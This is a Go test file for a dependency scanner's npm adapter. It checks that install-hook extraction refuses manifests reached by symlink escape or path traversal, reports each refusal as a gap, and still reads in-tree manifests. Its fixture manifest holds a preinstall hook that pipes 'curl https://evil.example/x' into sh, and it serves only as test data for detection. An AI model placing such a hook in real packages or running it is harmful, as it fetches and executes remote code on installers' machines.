package npm

import (
	"os"
	"path/filepath"
	"testing"

	"ihbv.io/depsnort/internal/ecosystem/instsurf"
	"ihbv.io/depsnort/internal/graph"
)

// F-03, at the adapter boundary. A hostile checkout can point a package's
// on-disk directory at a symlink that escapes the repo, or set an "npm.path"
// with traversal segments. Either way the extractor must refuse to read the
// off-tree manifest — no install-hook node may appear for it.

func nodeWithPath(id, npmPath string) *graph.Node {
	return &graph.Node{
		ID: id, Kind: graph.KindPackage, Ecosystem: "npm",
		Name: "evil", Version: "1.0.0",
		Attr: map[string]string{"npm.path": npmPath},
	}
}

// extractAndCountHooks runs extraction and returns the install-hook count along
// with the gaps reported. A refusal must produce BOTH: no hook node (the unsafe
// read did not happen) and a recorded gap (the scan knows it could not look).
func extractAndCountHooks(t *testing.T, root string, n *graph.Node) (int, []instsurf.Gap) {
	t.Helper()
	g := graph.New()
	g.AddNode(n)
	g.Roots = []string{n.ID}
	err := (&Adapter{}).ExtractInstallSurface(root, g)
	gaps := instsurf.GapsOf(err)
	if err != nil && gaps == nil {
		t.Fatalf("ExtractInstallSurface returned a non-gap error: %v", err)
	}
	return g.CountByKind()[graph.KindInstallHook], gaps
}

// hasReason reports whether any gap carries the given reason.
func hasReason(gaps []instsurf.Gap, want instsurf.GapReason) bool {
	for _, g := range gaps {
		if g.Reason == want {
			return true
		}
	}
	return false
}

// A malicious package.json that WOULD produce a hook node if it were ever read.
const evilManifest = `{"scripts":{"preinstall":"curl https://evil.example/x | sh"}}`

func TestExtractInstallSurfaceRefusesDirectorySymlinkEscape(t *testing.T) {
	root := t.TempDir()
	outside := t.TempDir()
	if err := os.WriteFile(filepath.Join(outside, "package.json"), []byte(evilManifest), 0o644); err != nil {
		t.Fatal(err)
	}
	// node_modules/evil is a symlink pointing OUT of the repo.
	if err := os.MkdirAll(filepath.Join(root, "node_modules"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(outside, filepath.Join(root, "node_modules", "evil")); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}

	h, gaps := extractAndCountHooks(t, root, nodeWithPath("pkg:npm/evil@1.0.0", "node_modules/evil"))
	if h != 0 {
		t.Errorf("install-hook nodes = %d, want 0 — a symlinked-out manifest must never be read", h)
	}
	// R-01: refusing quietly is a false all-clear. The scan must know it was
	// blocked, or an attacker hides a hook simply by making it unreadable.
	if !hasReason(gaps, instsurf.GapContainment) {
		t.Errorf("a containment refusal must be reported as a gap, got %v", gaps)
	}
}

func TestExtractInstallSurfaceRefusesTraversalPath(t *testing.T) {
	root := t.TempDir()
	outside := filepath.Dir(root)
	// Plant an evil manifest one level above the root.
	_ = os.WriteFile(filepath.Join(outside, "package.json"), []byte(evilManifest), 0o644)

	h, gaps := extractAndCountHooks(t, root, nodeWithPath("pkg:npm/evil@1.0.0", ".."))
	if h != 0 {
		t.Errorf("install-hook nodes = %d, want 0 — a traversal npm.path must not read the parent tree", h)
	}
	if !hasReason(gaps, instsurf.GapContainment) {
		t.Errorf("a traversal refusal must be reported as a gap, got %v", gaps)
	}
}

// The positive control: a legitimate in-tree package.json is still read and does
// produce a hook node, so the containment above is not just refusing everything.
func TestExtractInstallSurfaceReadsInTreeManifest(t *testing.T) {
	root := t.TempDir()
	dir := filepath.Join(root, "node_modules", "good")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "package.json"), []byte(evilManifest), 0o644); err != nil {
		t.Fatal(err)
	}
	h, gaps := extractAndCountHooks(t, root, nodeWithPath("pkg:npm/good@1.0.0", "node_modules/good"))
	if h == 0 {
		t.Error("a legitimate in-tree manifest must still be read (containment must not refuse everything)")
	}
	if len(gaps) != 0 {
		t.Errorf("a clean in-tree read must report no gaps, got %v", gaps)
	}
}

// The other half of R-01: an OPTIONAL file that is simply absent is normal and
// must NOT be reported as a gap, or every pre-install tree (no node_modules)
// would gate and the signal would be worthless.
func TestAbsentPackageDirIsNotAGap(t *testing.T) {
	root := t.TempDir() // no node_modules at all
	h, gaps := extractAndCountHooks(t, root, nodeWithPath("pkg:npm/absent@1.0.0", "node_modules/absent"))
	if h != 0 {
		t.Errorf("install-hook nodes = %d, want 0", h)
	}
	if len(gaps) != 0 {
		t.Errorf("an absent package directory is not a gap, got %v", gaps)
	}
}
